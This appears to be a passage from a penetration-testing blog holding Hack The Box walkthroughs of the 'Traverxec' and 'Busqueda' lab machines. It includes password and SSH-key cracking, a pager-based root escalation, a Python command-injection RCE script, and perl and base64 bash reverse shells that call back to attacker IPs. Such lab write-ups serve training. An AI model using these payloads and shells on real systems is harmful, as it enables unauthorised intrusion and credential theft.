hash-identifier david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ HASH: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Possible Hashs: [+] MD5(Unix) OK, so it&rsquo;s MD5. That should be recognized right away&hellip;
echo &#39;david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/&#39; &gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.john And it found a password:
Nowonly4me (david) Ok, so a valid credential is david / Nowonly4me (again, from a .htaccess file, so probably for the webserver)
public_www Earlier, reading /etc/passwd revealed that Nostromo has a server root directory at /var/nostromo. Inside that directory are some configuration files. This is one of them, the nhttpd.conf file:
# MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www Ahhh ok. So david has a directory /home/david/public_www/ that is accessible by the webserver. ex if /home/david/public_www/subdir exists on the filesystem, then we can access it by the url:
http://traverxec.htb/~david/subdir/
In this case, using the rev shell I searched what was the contents:
www-data@traverxec:/home$ ls -laR /home/david/public_www /home/david/public_www: total 16 drwxr-xr-x 3 david david 4096 Oct 25 2019 . drwx--x--x 5 david david 4096 Oct 25 2019 .. -rw-r--r-- 1 david david 402 Oct 25 2019 index.html drwxr-xr-x 2 david david 4096 Oct 25 2019 protected-file-area /home/david/public_www/protected-file-area: total 16 drwxr-xr-x 2 david david 4096 Oct 25 2019 . drwxr-xr-x 3 david david 4096 Oct 25 2019 .. -rw-r--r-- 1 david david 45 Oct 25 2019 .htaccess -rw-r--r-- 1 david david 1915 Oct 25 2019 backup-ssh-identity-files.tgz so there we have it. And since I&rsquo;ve already cracked the password this should be easy.
As expected, there is a file for download:
http://traverxec.htb/~david/protected-file-area/backup-ssh-identity-files.tgz
It turns out that file is an archive of david&rsquo;s .ssh directory. Opening it up reveals three ssh-relevant files:
I&rsquo;ll try the rsa key for logging in&hellip; ==&gt; Nope! Looks like there&rsquo;s a passphrase on it.
Cracking the RSA Private Key Drats. There&rsquo;s a passphrase on it. let me take a look at that key&hellip;
Ahh yep.That&rsquo;s a passphrase alright&hellip; It&rsquo;s PEM encrypted - might be possible to crack. I&rsquo;ll get at that.
ssh2john id_rsa &gt; id_rsa.john john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john Yep! got a result almost immediately:
hunter (id_rsa) Now, using id_rsa with the passphrase &ldquo;hunter&rdquo;, I should be able to SSH in as david&hellip;
User: david First, david holds the user flag. Simply cat it out from their home directory:
cat /home/david/user.txt Taking a look around, it seems david has their own bin directory on the path:
david@traverxec:~$ echo $PATH /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games That&rsquo;s a bit odd. This could lead to path abuse possibly. I might come back to this later 🚩
There are two files within: server-stats.head and server-stats.sh. This is server-stats.head:
.----. .---------. | == | Webserver Statistics and Data |.-&#34;&#34;&#34;&#34;&#34;-.| |----| Collection Script || || | == | (c) David, 2019 || || |----| |&#39;-.....-&#39;| |::::| &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.| /:::::::::::\\&#34; &#34; /:::=======:::\\ jgs &#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39; Cute! 😻 Love the ascii art
And here&rsquo;s server-stats.sh
#!/bin/bash cat /home/david/bin/server-stats.head echo &#34;Load: \`/usr/bin/uptime\`&#34; echo &#34; &#34; echo &#34;Open nhttpd sockets: \`/usr/bin/ss -H sport = 80 | /usr/bin/wc -l\`&#34; echo &#34;Files in the docroot: \`/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l\`&#34; echo &#34; &#34; echo &#34;Last 5 journal log lines:&#34; /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat ROOT FLAG Since journalctl invokes less usually, and less has a command prompt inside, we can make that last line vulnerable. Like many other full-screen programs that run solely in the terminal, less has a &ldquo;convenience&rdquo; feature that allows a user to run shell commands by prefixing any command with a &ldquo;!&rdquo;. Basically, we just need a way to keep less from closing immediately:
Just run the sudo part of the final line by itself
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service Make sure to shrink the window down to fewer than 5 lines tall. this way, less has to scroll, so the -n5 flag doesnt make it terminate immediately. If less doesnt terminate, you can run a shell through it!
I used it to spawn a bash reverse shell and baboom root access 🎉
LESSONS LEARNED Attacker Once you know the application and version, spend a minute looking for known vulnerabilities. I was glad that I checked this right away, as I may have wasted a lot of time enumerating the server or reading source code. Recognize which hashes are easy to crack. Having knowledge of which hash algorithms are easy to crack (and which are hard) is valuable. I knew right away that MD5 would crack very very quickly, so I wasn&rsquo;t afraid to throw it into john. It helps a lot that HTB only ever uses rockyou.txt. Many common programs have a feature to run shell commands. This is especially true for older programs that rose to popularity before multi-window environments. Keep these programs in-mind as privesc vectors. Also remember that a program like less might be disguised as journalctl, pager, etc. Defender Use a modern webserver that still has an active development community. There are always vulnerabilities: it&rsquo;s pretty much a fact of computers - better to go with a server that has folks actively working to patch those vulnerabilities than one that has stagnated. Keep passwords safe by using a stronger hashing algorithm and more complex passwords. This is just one of a multitude of ways to keep passwords secure. Really, if you must use passwords, please use a proper password manager. Be very careful with SUID. If it&rsquo;s used, there should be absolutely no way to for the user to do file-disclosure or any shell command execution. Lock it down! `,url:"https://4wayhandshake.github.io/walkthrough/traverxec/"},"https://4wayhandshake.github.io/walkthrough/busqueda/":{title:"Busqueda",tags:["Command Injection","Perl","Subdomain","Credential Re-use","Git","Path Abuse"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION For folks like myself that have nada espanol, it turns out &ldquo;busqueda&rdquo; is Spanish for &ldquo;search&rdquo;. It should be no surprise that this box is a search engine. Or rather, it is an aggregator of several search engines all in one.
Warning: This walkthrough contains many spoilers. No spoilers will be unexpected if you read the walkthrough sequentially.
RECON I followed my typical first steps. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with my typical nmap &ldquo;init&rdquo; scan:
nmap -sV -sC -O -n -Pn --port-ratio 0.30 -oA nmap/30perc $RADDR My &ldquo;30 percent&rdquo; nmap scan: explained -sV Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running. -sC Default script scan; shorthand for --script=default -O Enable OS detection. Nmap makes its best guess to fingerprint the target. -n Disable DNS resolution: we don&rsquo;t need hostnames. Speeds up the scan greatly. -Pn Skip host discovery, which is unnecessary if we&rsquo;re targeting just one host. &ndash;port-ratio 0.30 Scan the top 30% most commonly used ports -oA Output results in all formats, to the nmap/init-scan directory.
I like this idea of scanning only the top 30% of ports. It saves a lot of time but finds services running on ports greater than 1000
And oddly enough, I didn&rsquo;t really get any results. Just a single mention of port 80 and nmap refusing to fingerprint it:
But clearly there is a webserver running, so I tried it with whatweb and cURL banner-grabbing:
whatweb $RADDR &amp;&amp; curl -IL $RADDR http://10.10.11.208 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)] ERROR Opening: http://searcher.htb/ - no address for searcher.htb HTTP/1.1 302 Found Date: Sat, 10 Jun 2023 21:29:45 GMT Server: Apache/2.4.52 (Ubuntu) Location: http://searcher.htb/ Content-Type: text/html; charset=iso-8859-1 curl: (6) Could not resolve host: searcher.htb Ok no problem, looks like I&rsquo;ll just have to add it to /etc/hosts a little earlier during recon than I normally would. Also, I&rsquo;d usually add the name of the box as the domain (&ldquo;busqueda.htb&rdquo;), but the request is being redirected to searcher.htb so I&rsquo;ll add that instead:
echo &#34;10.10.11.208 searcher.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
To test this, I tried putting searcher.htb into my web browser and wound up at the index page of the target.
With the new hostname in /etc/hosts, I&rsquo;ll try running that nmap scan again now:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 00:47 IDT Nmap scan report for searcher.htb (10.10.11.208) Host is up (0.18s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.52 | http-server-header: | Apache/2.4.52 (Ubuntu) |_ Werkzeug/2.1.2 Python/3.10.6 |_http-title: Searcher Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: searcher.htb OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt ffuf -w $WLIST:FUZZ -u http://$RADDR:80/ -H &#39;Host: FUZZ.htb&#39; &hellip; let that run for a few seconds, realize that all results are false-positives - each with 18 words. Do the same search but filter out that size of page. And just to be sure, use a larger wordlist but run twice as many threads, and follow redirects too:
WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt ffuf -w $WLIST:FUZZ -u http://$RADDR:80/ -H &#39;Host: FUZZ.htb&#39; -fw 18 -t 80 -r &hellip; Yes still a LOT of false-positives. To see what&rsquo;s going on, a simple cURL with the location (with redirect) header is enough:
(virus.htb was one of the false-positives found from the previous ffuf.)
curl $RADDR -L https://virus.htb OK, that&rsquo;s fine: I don&rsquo;t think I&rsquo;ll find anything interesting through just subdomain or vhost enumeration. Time to change strategies.
FOOTHOLD SSTI Attempts I noticed at the bottom of the page, the line &ldquo;Powered by Flask and Searchor 2.4.0&rdquo;. In a few other CTF boxes, Flask implementations have been susceptible to SSTI attacks. When you submit a search on this page, the search string gets reflected on the resulting page: the idea here is to try various inputs containing an expression, and see if the template engine reflects the value you sent, or parses the value and reflects the result of the expression:
Nope, following this flowchart landed me in the Not vulnerable box.
One notable result though: the search fails to evaluate if the query string contains singlequotes.
Command Injection So how about Searchor? What&rsquo;s it all about? Thankfully, it&rsquo;s an open-source search tool, so we can easily check the github page to see how it is configured and used. More importantly, it gives some hints as to how the code may be running server-side. For example, a wikipedia search:
from searchor import Engine print(Engine.Wikipedia.search(&#34;Hello, World!&#34;)) Interesting. If this &ldquo;Searchor&rdquo; search engine aggregator was poorly implemented, it may attempt to use an expression like the following:
print(Engine.Untrusted_user_input.search(&#34;Hello, World!&#34;)) To gather some evidence on this idea, I&rsquo;ll catch the form POST using Burp proxy, and try changing out the value of which search engine to use. Here, I&rsquo;ve changed StackOverflow to HeapOverflow:
POST /search HTTP/1.1 Host: searcher.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 47 Origin: http://searcher.htb DNT: 1 Connection: close Referer: http://searcher.htb/ Upgrade-Insecure-Requests: 1 Sec-GPC: 1 engine=HeapOverflow&amp;query=chatgpt+took+mer+jerb Unfortunately, it was caught by the application:
Let&rsquo;s try testing the search string instead. Since there is no reasonable way to restrict what a user searches, it probably has fewer restrictions. For reference, this is how the web app responds to a typical search:
We already know that the system is responding weirdly to a singlequote, so I&rsquo;ll start there:
engine=StackOverflow&amp;query=test&#39; Response:
[this space is intentionally left blank] 🤔 Perhaps some kind of parsing error. We know it&rsquo;s being parsed in python, so let&rsquo;s pop in a comment character to end the line:
engine=StackOverflow&amp;query=test&#39;# Response:
[this space is intentionally left blank] Same result. There&rsquo;s a good chance that the comment character &lsquo;#&rsquo; is ending the expression prematurely. Let&rsquo;s try adding closing parentheses, one by one, before the comment character and see if the expression changes:
😮 OK, This might mean something! Not only do we get a result, but this shows that the expression is properly terminated by using one singlequote and a closing parenthesis. Since this is python, we can use the concatenation operator &lsquo;+&rsquo; to see what we can tack-on to the expression (either before or after the closing parenthesis):
That didn&rsquo;t work. But also, it was unlikely that would work due to character encoding. I&rsquo;ll try URL-encoding the text between the &lsquo;)&rsquo; and the &lsquo;#&rsquo; (URL-encode special chars only):
😁 Alright! Now we&rsquo;ve got something! Since we&rsquo;re able to include an extra string, it makes sense that we should be able to include anything that evaluates to a string. So, using python, what takes a string as input and evaluates to a string? Something like str(eval('input')) is as close as it gets:
engine=Wikipedia&amp;query=test&#39;)+str(eval(&#39;7*7&#39;))# Or, URL-encoding the special characters:
This seems like we&rsquo;re getting closer. It&rsquo;s now evaluating an expression and returning the result, much like the attempts at an SSTI from earlier. How about importing a module and running something? To try this out, I&rsquo;ll use the URL-encoded version of something like this: import subprocess; subprocess.call(&quot;id&quot;):
That didn&rsquo;t seem to work. I also tried things like escaping the doublequote characters, but still no success. To see what was going on, I tried putting the same thing into a python interpreter on my attacker machine:
Ah, I see. So this wasn&rsquo;t valid to begin with. Of course it didn&rsquo;t work when trying to execute it within the webapp. Suspecting that it&rsquo;s something to do with the semicolon, I tried rephrasing this code from an imperative style into a functional style:
import subprocess; subprocess.call(&#34;id&#34;) &hellip;turns into&hellip;
__import__(&#34;subprocess&#34;).call(&#34;id&#34;) And it was actually successful:
Trying out this idea in Burp:
Wonderful! Now that I know a simple id command works, I&rsquo;ve written the idea into a short python script:
#!/usr/bin/python3 import requests from urllib.parse import quote url = &#39;http://searcher.htb/search&#39; debugMode = False host = url[7:str.find(url[7:],&#39;/&#39;)+7] referrer = url[:str.find(url[7:],&#39;/&#39;)+8] headers = { &#39;Host&#39;: host, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#39;, &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, &#39;Referer&#39;: referrer, } def getResponse(qry): formData = f&#39;engine=Wikipedia&amp;query=\\&#39;){qry}#&#39; if debugMode: print(formData) response = requests.post(&#39;http://searcher.htb/search&#39;, headers=headers, data=formData, verify=False) return f&#39;[{response.status_code}] {response.text}&#39; def argsToArray(args): if len(args.split()) == 1: return f&#39;&#34;{args}&#34;&#39; s = &#39;[&#39; for a in args.split(): s += f&#39;&#34;{a}&#34;,&#39; s = s[:-1] + &#39;]&#39; return s print(f&#39;POSTing to {url}...&#39;) print(&#39;Enter commands at the prompt. Type &#34;exit&#34; or leave blank to quit.&#39;) while True: try: s = input(&#34;&gt;&gt; &#34;) if s == &#34;exit&#34; or not s: print(&#39;exiting...&#39;) break args = argsToArray(s) urlEncoded=quote(f&#39;+str(eval(\\&#39;__import__(&#34;subprocess&#34;).call({args})\\&#39;))&#39;) print(getResponse(urlEncoded)) except: break While this script seems to handle most commands, there are some things that it seems like it can&rsquo;t accomplish. Unfortunately, my attempts to get a reverse shell working directly through this RCE script were unsuccessful.
I tried many kinds of reverse shells: netcat, bash, python3, perl. None worked directly.
Edit: I later discovered the problem. It was a matter of encoding. Consider using base-64 encoding for a traditional bash reverse shell here. Or proceed with this walkthrough to see how I got past this issue by transferring a perl script and running it locally via my RCE.
I finally created a reverse shell by doing the following:
On my attacker machine, stand up a python webserver.
Within that webserver, create a new file containing a perl reverse shell. Call the file revshell.pl:
use Socket;$i=&#34;10.10.14.11&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);}; Also on my attacker machine, set a new firewall rule for connections (from the target) on port 4444. Set up a netcat listener on port 4444.
Using the python script / RCE and the local copy of curl, download the perl reverse shell to the target machine. Download the file into /home/svc/rshell.pl
curl 10.10.14.11:8000/rshell.pl -o /home/svc/rshell.pl Run the downloaded perl script. You should now have a reverse shell: Upgrading the Shell I originally learned this procedure from this blog post. It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this.
Starting with the &ldquo;dumb&rdquo; shell, change from sh to bash:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; You&rsquo;ll have a better prompt now, but still no tab completion and still no ability to use things like less or vi. Let&rsquo;s fix that:
[ctrl+z] stty raw -echo fg [enter] [enter] export TERM=xterm256-color The shell will be backgrounded, then enable echo mode with stty, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours 🌈.
USER FLAG User Enumeration (svc) Run id. Find out what groups this user is in. Locate the user within /etc/passwd if possible; see if they have a shell and/or home directory.
id &amp;&amp; cat /etc/passwd | grep -v nologin | grep -v /bin/false Run env. Find out if any interesting environment variables are set. Check the PATH
env Check if the user can sudo. (Usually you&rsquo;ll need SSH access for this, not just a reverse shell.)
sudo -l Check locations that are writable by the user or its group
find / -user [username] 2&gt;/dev/null find / -group [groupname] 2&gt;/dev/null Does the user already have any useful tools?
which nc netcat socat curl wget python python2 python3 perl php Check for any active and listening sockets
netstat -tulpn | grep LISTEN ☝️ also try netstat -antp
Does the user have anything in cron?
crontab -l Does the system or root have anything in cron?
cat /etc/crontab ls -laR /etc/cron* Find any SUID or SGID executables that are accessible by the user
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; Download the toolbox (not covered in-depth here).
My toolbox includes linpeas, linenum, pspy, and chisel.
Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target.
I&rsquo;ve prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.
Run pspy and take a look at any running processes. Since pspy is closed with ctrl+c, and your reverse shell may not be fully interactive, it is best to run this on a timeout:
timeout 2m ./pspy Run pre-scripted enumeration tools, such as LinEnum or linpeas
./LinEnum.sh ./linpeas.sh -w Notable results from the foothold strategy included the following:
(1) Showed that the only user with a home directory is svc.
(2) Checking env hinted at something called pm2 that might have root access and is acting as a manager of searcher.htb:
... PIDFILE=/root/.pm2/pm2.pid ... PM2_USAGE=CLI exec_interpreter=python3 PM2_HOME=/root/.pm2 ... pm_pid_path=/root/.pm2/pids/app-0.pid ... pm_err_log_path=/root/.pm2/logs/app-error.log ... pm_exec_path=/var/www/app/app.py ... pm_out_log_path=/root/.pm2/logs/app-out.log ... (3) Cannot run sudo -l in this reverse shell.
(5) Was already performed prior to getting reverse shell, but revealed that nc, netcat, curl, wget, python3 and perl are all present.
(6) Revealed quite a few listening processes that did not appear during enumeration:
Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN 1612/python3 tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:222 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:35085 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - (9) showed an SUID binary I have not seen before. May or may not be important:
-rwxr-sr-x 1 root tty 22912 Feb 21 2022 /usr/bin/write.ul (11) Linpeas found some possible credentials: and LinEnum found that this pm2 thing is probably running in Docker:
[-] Anything juicy in docker-compose.yml: -rw-r--r-- 1 root root 477 Jun 15 2022 /usr/local/lib/node_modules/pm2/node_modules/@pm2/io/docker-compose.yml While running pspy, I caught somebody else in the act of setting up a reverse shell. I thought this was method was clever, and probably would have saved me a lot of time:
sh -c echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC85MDAxIDA+JjEn|base64 -d|bash -i And it looked like they had used this reverse shell directly from the website:
CMD: UID=1000 PID=145357 /usr/bin/python3 /usr/local/bin/searchor search Google &#39;,__import__(&#39;os&#39;).system(&#39;echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC85MDAxIDA+JjEn|base64 -d|bash -i&#39;)) # junky comment Now that I&rsquo;ve taken a look at the what the svc user can do, it&rsquo;s probably time to just grab the user flag. We already know that svc is the only user with a home directory, so simply cat out the flag:
cat /home/svc/user.txt ROOT FLAG Check the Listening Services The information found using netstat seemed to be the most promising. To investigate, I used curl to check what was on ports 5000 and 3000. Port 5000 appeared to just be the page for searcher.htb, as seen before. However, port 3000 was that gittea thing we saw earlier!
This shows there is a subdomain: gitea.searcher.htb. I added this to my attacker box&rsquo;s /etc/hosts and tried loading the page:
I had never heard of gitea, so clicked the link at the bottom of the page, to go read the open source documentation. As the banner states, gitea is a self-hosted Git service. It seems like a drop-in replacement for many other git services. As such, there&rsquo;s a really good chance that, like github, packages using gitea likely also use a .git directory.
To investigate, I did a quick search for any .git directories that svc has access to on the box:
find / -name &#34;*.git&#34; -d 2&gt;/dev/null /var/www/app/.git /opt/scripts/.git 😱 Oh no&hellip; how could I have been so ignorant?! When I initially got RCE (and also when I got a reverse shell), I forgot to use ls -la to check my current directory! There was a hidden .git directory in /var/www/app that I completely missed!
Discovered credentials: cody / jh1usoih2bkjaspwe92
These credentials were a valid login for http://gitea.searcher.htb
Unfortunately, there does not seem to be any useful info inside this gitea repo. There has only been one commit, so no info to be gleaned from changes to the code or secrets leftover from development. Also, under the user settings for cody, there is no security info and no GPG keys have been added.
🤔 It&rsquo;s unlikely this gitea thing was just a distraction. I&rsquo;ll keep these credentials in mind and investigate credential re-use later. For now, there are other listening ports to check out: 222, 35085, and of course 68 (probably DHCP), 3306 (probably mysql), and 22 (SSH)
Apparently tcp port 222 is a common port to run an alternate SSH service on, when 22 is already in use. That looks like exactly what is happening here.
Just to be thorough, I also took a look at the directory /etc/ssh. The config file sshd_config seemed pretty normal, and password authentication is allowed. Also I took a peek at the public keys; this is the rsa one:
svc@busqueda:/etc/ssh$ cat ssh_host_rsa_key.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCe8y5sUqGeBfItXUpK9zopNgmK3NvvzxvQyCmZoZslEaSLAd+oaxKoBuRlVgGTO0JQDaTZndWGKmMafT3Yh0SOsEujh6NIWhyXEGMXbs59zUcyYwEf/8wJ3KEJ0vaG8h0UjmrcqyiWjNZrt1nRGoEQQx5nyM0a+Wp+EbHuhJR1QccY1XSyLf6rgWw2n58j/oZcxakUbtSpoQeoWYmvf+n/AyWcaGsmsbl/xGOXT05pBJMxXRP5eyd8RgNtCYJhI/QjVrcrOgvRig9arVl775vpkR6yeFaXIpCSTt6nRBB3fNMY7Dy1PvHfoACiG394nCd55W3FV+RW32mlcNoxu3NIpKCONQbuhhjFDLsUtDMi2Nbl80t2wDFx0QJggVNwofyKcYOpXDjqDuQdtgP8XeS5mKSjPwt0gnyq44jsHT4eEsQIMbCVvHBAlsGRkUYgLKzxCdy1lOJIFQ18gbqgky+AeclieqNEtbcxuqP9IoihiG6gouhy/1EQfXNK6j0LzeU= root@graph TCP Port 35085 seems to also be using http, but there is no redirect and I&rsquo;m not sure yet what page it&rsquo;s hosting.
Checking /etc/hosts didn&rsquo;t provide any insight either:
svc@busqueda:/var/www/app$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 busqueda searcher.htb gitea.searcher.htb Credential re-use check Checked the following credentials:
cody / jh1usoih2bkjaspwe92 administrator / jh1usoih2bkjaspwe92 svc / jh1usoih2bkjaspwe92 root / jh1usoih2bkjaspwe92 all of the above usernames with their usernames as their passwords as well, ex: svc / svc TCP port 222 &ndash;&gt; Nope
MySQL (port 3306) &ndash;&gt; Nope (other credential attempts are not shown here)
SSH (port 22) &ndash;&gt; 🎉 Success! We now know that a valid SSH credential is svc / jh1usoih2bkjaspwe92.
Checking sudo -l Now that I&rsquo;m using SSH, not the reverse shell, I can check sudo -l, which often has big hints for privilege escalation:
sudo -l Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * 🤔 Reviewing my notes, it looks /opt/scripts was also one of the directories containing a .git directory.
Alright, let&rsquo;s try it out then:
😑 Oh, woops. Take a careful look at the last line of the output of sudo -l. There is an asterisk following the command. This means that I&rsquo;ll need some args:
docker ps and docker inspect are commands for usage in Docker. full-checkup doesn&rsquo;t seem to really do anything.
Running system-checkup.py docker-ps seems to just run the regular docker ps. It doesn&rsquo;t take any arguments.
On the other hand, system-checkup.py docker-inspect is a little different than docker inspect. For reference, this is the official documentation on docker inspect. It seems that the developer on this box intended docker-inspect to be a pass-through for docker inspect but only expose the format -f --format option:
Trying out the command using one of the example formats from the documentation confirms this suspicion:
I found an article showing how to use the format string in a slightly more advanced way than the official documentation describes. It has one example that loops through the container&rsquo;s arguments:
docker container inspect -f &#39;{{printf &#34;%s &#34; .Path}}{{range .Args}}{{printf &#34;%s &#34; .}}{{end}}&#39; [container_name|id] It looks like this uses dot notation grab tags from some kind of hierarchical data structure. I realized you can dump everything about the container by simply omitting the tags such as Path or Args, instead by iterating through the root of the data structure &ldquo;.&rdquo; :
sudo python3 /opt/scripts/system-checkup.py docker-inspect &#39;{{json .}}&#39; gitea 😮 Whoa! I can already see that there is some juicy stuff in there. But it&rsquo;s a bit hard to look at&hellip;
Thankfully, the &lsquo;json&rsquo; part of the format string worked, so it shouldn&rsquo;t be difficult to clean up. I ran it through this online JS beautifier to see it in a more legible format: (I&rsquo;ve omitted the majority of it, so that the important stuff is visible).
This is the dump from gitea:
{ &#34;Id&#34;: &#34;960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb&#34;, ... &#34;Config&#34;: { ... &#34;StdinOnce&#34;: false, &#34;Env&#34;: [&#34;USER_UID=115&#34;, &#34;USER_GID=121&#34;, &#34;GITEA__database__DB_TYPE=mysql&#34;, &#34;GITEA__database__HOST=db:3306&#34;, &#34;GITEA__database__NAME=gitea&#34;, &#34;GITEA__database__USER=gitea&#34;, &#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&#34;, &#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;, &#34;USER=git&#34;, &#34;GITEA_CUSTOM=/data/gitea&#34;], ... }, &#34;NetworkSettings&#34;: { ... &#34;Ports&#34;: { &#34;22/tcp&#34;: [{ &#34;HostIp&#34;: &#34;127.0.0.1&#34;, &#34;HostPort&#34;: &#34;222&#34; }], &#34;3000/tcp&#34;: [{ &#34;HostIp&#34;: &#34;127.0.0.1&#34;, &#34;HostPort&#34;: &#34;3000&#34; }] }, ... } } The reveals a mysql database credential: gitea / yuiu1hoiu4i5ho1uh
And this is the dump from mysql_db:
{ &#34;Id&#34;: &#34;f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8&#34;, ... &#34;Name&#34;: &#34;/mysql_db&#34;, ... &#34;Mounts&#34;: [{ &#34;Type&#34;: &#34;bind&#34;, &#34;Source&#34;: &#34;/root/scripts/docker/mysql&#34;, &#34;Destination&#34;: &#34;/var/lib/mysql&#34;, &#34;Mode&#34;: &#34;rw&#34;, &#34;RW&#34;: true, &#34;Propagation&#34;: &#34;rprivate&#34; }], &#34;Config&#34;: { ... &#34;ExposedPorts&#34;: { &#34;3306/tcp&#34;: {}, &#34;33060/tcp&#34;: {} }, ... &#34;Env&#34;: [&#34;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&#34;, &#34;MYSQL_USER=gitea&#34;, &#34;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&#34;, &#34;MYSQL_DATABASE=gitea&#34;, &#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;, &#34;GOSU_VERSION=1.14&#34;, &#34;MYSQL_MAJOR=8.0&#34;, &#34;MYSQL_VERSION=8.0.31-1.el8&#34;, &#34;MYSQL_SHELL_VERSION=8.0.31-1.el8&#34;], ... &#34;Labels&#34;: { ... &#34;com.docker.compose.project.config_files&#34;: &#34;docker-compose.yml&#34;, &#34;com.docker.compose.project.working_dir&#34;: &#34;/root/scripts/docker&#34;, ... } }, &#34;NetworkSettings&#34;: { ... &#34;Ports&#34;: { &#34;3306/tcp&#34;: [{ &#34;HostIp&#34;: &#34;127.0.0.1&#34;, &#34;HostPort&#34;: &#34;3306&#34; }], &#34;33060/tcp&#34;: null }, ... } } Even better, in addition to the mysql database credential from the other dump, this reveals the root credential for the mysql database!
